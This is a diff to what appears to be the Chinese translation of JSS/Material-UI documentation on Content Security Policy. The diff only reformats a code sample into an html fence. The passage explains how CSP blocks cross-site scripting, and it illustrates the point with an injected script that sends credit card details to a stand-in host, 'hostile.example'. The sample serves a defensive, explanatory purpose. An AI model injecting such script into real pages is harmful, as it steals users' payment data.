@@ -416,10 +416,11 @@ JSS uses feature detection to apply the correct prefixes. [Don't be surprised](h
 
 基本上，CSP通过要求开发人员将其资产从中检索的源列入白名单来缓解跨站点脚本（XSS）攻击。 此列表作为服务器的标头返回。 例如，假设您有一个托管在` https://example.com`的网站 CSP头`default-src：'self';`将允许位于`https://example.com/*`的所有资产并否认所有其他人。 如果您的网站的某个部分容易受到XSS的影响而未显示未转义的用户输入，则攻击者可以输入以下内容：
 
-    <script>
-      sendCreditCardDetails('https://hostile.example');
-    </script>
-    
+```html
+<script>
+  sendCreditCardDetails('https://hostile.example');
+</script>
+```
 
 此漏洞允许攻击者执行任何操作。 但是，使用安全的CSP标头，浏览器将不会加载此脚本。
 
